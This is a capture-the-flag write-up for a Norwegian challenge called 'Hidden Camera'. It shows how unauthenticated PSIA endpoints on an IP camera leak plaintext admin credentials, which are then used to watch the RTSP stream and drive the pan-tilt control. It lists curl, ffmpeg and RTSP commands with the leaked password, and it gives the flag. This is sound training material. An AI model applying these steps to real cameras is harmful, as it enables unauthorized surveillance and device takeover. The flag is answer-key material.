# Hidden Camera

Author: Shirajuki  
URL: <http://129.241.150.69/>

> Et billig, skjult overvåkningskamera følger med på Cyber og reinsdyrene. Klarer du å få tilgang til strømmen og finne flagget som skjuler seg i signalet?

## TL;DR

Unauthenticated PSIA endpoints leak user credentials (`/PSIA/Security/AAA/users`). Use the leaked admin account to view the RTSP stream and drive the PTZ. The flag is visible in the video feed once you move the camera into position.

## Steps (what was done)

1) Recon (web):
   - Fetched `/` → login page referenced JS; pulled `/script/common.js` to see PSIA paths and RTSP defaults.  
   - `/PSIA/YG/netWork/getAllPort` confirmed RTSP on `8554`.  
   - `/PSIA/System/deviceInfo` returned banner unauthenticated.
2) Credential leak (no auth required):
   - `curl http://129.241.150.69/PSIA/Security/AAA/users` → plaintext users; admin creds `admin / a_long_password`.
3) Stream access:
   - Main stream: `rtsp://admin:a_long_password@129.241.150.69:8554/profile0` (VLC with `?tcp`).
4) PTZ control (HTTP PUT):
   - Move: `.../continuous?pan=1&tilt=0` (right), `pan=-1` (left), `tilt=1/-1` (up/down).  
   - Stop: `.../continuous?pan=0&tilt=0`.  
5) Flag:
   - Drove PTZ until the flag text appeared in the feed; captured from the stream.

## Helper script

`ptz_control.py` Provided keyboard control (arrows/WASD move). Ran with:

```bash
python3 ptz_control.py
```

## Verification

- Streamed in VLC via `rtsp://admin:a_long_password@129.241.150.69:8554/profile0?tcp`.
- Flag extracted from the feed.

## Flag

`JUL{ho_ho_ho_er_det_jul_snart???}`

## Notable endpoints

- `/PSIA/Security/AAA/users` – user list + passwords (no auth).  
- `/PSIA/YG/netWork/getAllPort` – RTSP port info.  
- `/PSIA/YG/PTZCtrl/channels/0/continuous` – PTZ move.  
- `/PSIA/YG/PTZCtrl/channels/0/continuous/zoom` – zoom.  
- Stream: `rtsp://admin:a_long_password@129.241.150.69:8554/profile0` (main) / `profile1` (sub).

## Tools used

- curl (enum, PSIA leak, PTZ control)
- VLC (view RTSP)
- python + requests (`ptz_control.py`)
- ffmpeg (snapshots)

```bash
ffmpeg -y -rtsp_transport tcp -i rtsp://admin:a_long_password@129.241.150.69:8554/profile0 -frames:v 1 frame2.jpg`
```
